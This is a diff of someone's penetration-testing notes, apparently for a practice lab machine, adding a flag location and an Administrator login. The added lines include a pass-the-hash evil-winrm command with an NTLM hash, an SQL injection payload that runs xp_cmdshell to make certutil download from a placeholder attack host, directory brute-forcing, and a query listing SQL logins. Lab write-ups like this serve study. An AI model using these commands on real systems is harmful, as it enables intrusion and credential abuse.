@@ -3,10 +3,10 @@
 - 
 # Flag Location
 `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
-- 
+- C:\Users\Administrator\Desktop\proof.txt
 # Accounts
-### ???
-`<access command>`
+### Administrator
+`evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168>`
 ```
 
 ```
@@ -69,6 +69,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```c
     gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
     gobuster dir -u 192.168.159.121 -w /usr/share/wordlists/dirb/common.txt -t 5
+    // Attempt sql injection on website
+    ...
+    //using burp username field
+    admin'; EXEC xp_cmdshell "certutil -urlcache -split -f http://<attack host IP addr>:8000/works"; -- -
+    '
 
+    // found on discord...
+    evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168
+    Get-Command Invoke-Sqlcmd
+    Invoke-Sqlcmd -ServerInstance "localhost" -Query "SELECT name FROM sys.sql_logins;"
 
 ```
